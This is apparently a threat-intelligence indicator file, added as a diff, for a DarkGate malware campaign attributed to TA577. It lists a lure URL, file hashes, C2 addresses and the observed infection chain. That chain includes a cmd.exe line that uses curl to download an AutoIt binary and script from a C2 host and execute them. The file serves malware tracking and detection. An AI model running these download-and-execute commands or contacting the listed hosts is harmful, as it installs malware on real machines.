@@ -1,0 +1,33 @@
+11.10.2023 | Darkgate | TA577
+
+*************************************************
+
+.url https://sexsecret.com.mx/tqe/
+.zip 8a773f78391b298dd5d707a5e0b8bb1a7a6c51e5beb2a1e3a4fcb78465dfc13f
+.vbs 926a875b17007ab99572ca73c670148eb964f5d9dd9a2abfd496a9c109f4db60
+
+*************************************************
+
+url > zip > vbs
+
+WScript.exe" "C:\Users\Admin\AppData\Local\Temp\HH-41.vbs"
+
+cmd.exe /c cd /d %temp% & curl -o Autoit3.exe http://eugelens.com:2351 & curl -o bwmhtm.au3 http://eugelens.com:2351/msiqpwucsyz & Autoit3.exe bwmhtm.au3
+
+curl  -o Autoit3.exe http://eugelens.com:2351 
+
+curl  -o bwmhtm.au3 http://eugelens.com:2351/msiqpwucsyz 
+
+Autoit3.exe  bwmhtm.au3
+
+rundll32.exe C:\Windows\SYSTEM32\EDGEHTML.dll,#141 Microsoft.VCLibs.140.00_8wekyb3d8bbwe
+
+svchost.exe -k UnistackSvcGroup
+
+*************************************************
+
+c2
+
+http://eugelens.com:2351
+http://eugelens.com:2351/msiqpwucsyz
+http://eugelens.com:2351/idzktm
